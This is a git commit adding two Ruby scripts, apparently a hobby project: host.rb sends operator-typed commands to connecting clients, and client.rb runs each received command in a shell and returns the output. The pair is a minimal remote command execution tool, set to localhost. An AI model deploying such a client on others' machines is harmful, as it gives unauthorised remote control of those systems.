fc636fc5fe4e1ee8ec986bbce764b008c284ff81
Beyar <Beyar-123@hotmail.com>
2018-03-30 00:10:02 +0200

    Add files via upload

---
+++ client.rb
@@ -0,0 +1,95 @@
+# # # # # # # #
+#!/usr/bin/env ruby
+# # # # # # #
+
+# # # # # #
+# Created Mars 29th 2018
+# Copyright (c) 2018 Beyar N.
+# # # #
+
+# # #
+# Name: client.rb
+# #
+
+# System methods
+class Sys
+	def Sys::cls
+		system "clear" or system "cls"
+	end
+	def Sys::cmd(input)
+		system(input)
+	end
+end
+
+# Clear
+Sys.cls
+
+# Library
+require "socket"
+
+# Default connection
+host = "localhost"
+port = 4434
+
+loop = true
+while loop == true do
+
+	# Connect, get & close
+	begin
+		begin
+			inbound = TCPSocket.new host, port
+			rescue Errno::ECONNREFUSED
+			loop = false
+		end
+		iterating = true
+		array = [recip = nil, recport = nil, command = nil, id = nil]
+		count = 0
+
+		# View message
+		while iterating
+			incoming = inbound.gets
+			array[count] = incoming
+			if incoming == nil
+				iterating = false
+			end
+			count += 1
+		end
+
+		# Split data and review
+		inbound.close
+		array = array.reverse.drop(1).reverse
+		recip = array[0].delete("\n")
+		recport = array[1].delete("\n")
+		command = array[2].delete("\n")
+		id = array[3].delete("\n")
+		inbound = TCPServer.new recip, recport
+		ending = false
+		begin
+			arr = `#{command}`.split("\n")
+			rescue Errno::ENOENT
+			arr = "Unkown command.|".split("|")
+		end
+
+		# Waiting for connection and deliver
+		begin
+			while ending != true
+				incoming = inbound.accept
+				for each in arr
+					incoming.puts "#{id}: #{each}"
+				end
+				incoming.close
+				ending = true
+			end
+		end
+		
+		inbound.close
+		incoming.close
+		sleep(1)
+		
+		rescue NoMethodError
+		sleep(5)
+		rescue IOError
+		sleep(5)
+		break
+	end
+end
---
+++ host.rb
@@ -0,0 +1,131 @@
+# # # # # # # #
+#!/usr/bin/env ruby
+# # # # # # #
+
+# # # # # #
+# Created Mars 29th 2018
+# Copyright (c) 2018 Beyar N.
+# # # #
+
+# # #
+# Name: host.rb
+# #
+
+# System methods
+class Sys
+	def Sys::cls
+		system "clear" or system "cls"
+	end
+	def Sys::cmd(input)
+		system(input)
+	end
+end
+
+# Clear
+Sys.cls
+
+# Library
+require "socket"
+require "ipaddr"
+require "net/http"
+
+# Get details
+standardPort = 4434
+ending = false
+#public = Net::HTTP.get(URI("https://api.ipify.org"))
+iip_ipadress = Socket.getifaddrs
+iip_ipadress.each do |iip_interface|
+	if iip_interface.addr
+		if iip_interface.addr.ipv4?
+			#puts"#{iip_interface.name}#{White} has address #{iip_interface.addr.ip_address}#{White}"
+			@interface = myinterface = iip_interface.name
+			#@private = myipadress = iip_interface.addr.ip_address
+			@private = "localhost"
+		end
+	end
+end
+
+recon = []
+connect_count = 0
+count = 0
+loop = true
+while loop == true
+	
+	# Details
+	puts "[!] Starting receiver!\n"
+	inbound = TCPServer.new standardPort
+	puts "[+] Receiver started!"
+	begin
+		print "\n[!] Command: "
+		command = gets.chomp
+		if command == "quit" || command == "exit"
+			loop = false
+		elsif command == "cls"
+			Sys.cmd("clear")
+		end
+		rescue Interrupt
+		o = "Shutting down host."
+		break
+	end
+	puts
+	
+	# Accept, send & close
+	begin
+		ending = false
+		while ending != true
+			randPort = (2000..65535).to_a.sample
+			id = (0..100).to_a.sample
+			incoming = inbound.accept
+			puts "\n[!] New client!"
+			incoming.puts @private
+			recon.push(@private)
+			puts "[!] Directed to host: #{@private}"
+			incoming.puts randPort
+			recon.push(randPort)
+			puts "[!] Directed to port: #{randPort}"
+			incoming.puts command
+			puts "[!] Sent command: #{'"'+command+'"'}"
+			incoming.puts id
+			puts "[!] Identified as ID: #{id}"
+			incoming.close
+		end
+		rescue Interrupt
+		ending = true
+		inbound.close
+		puts "[-] Shutting down receiver!"
+	end
+
+	# Connect, commend & close
+	finish = false
+	while finish != true
+		puts "\n[+] Starting connection ##{connect_count}..."
+		puts "[!] Connecting to #{recon[count]} #{recon[count+1]}"
+		begin
+			inbound = TCPSocket.new recon[count], recon[count+1]
+			iterating = true
+			while iterating
+				incoming = inbound.gets
+				if incoming == nil
+					iterating = false
+				else
+					puts "[!] Received data ID #{incoming}"
+				end
+			end
+			inbound.close
+			count += 2
+			connect_count += 1
+			if count == recon.count
+				finish = true
+			end
+			rescue SocketError
+			finish = true
+			Sys.cls
+			puts "No sessions received."
+		end
+	end
+	
+	inbound.close
+	puts
+	
+end
+puts "\n#{o}"
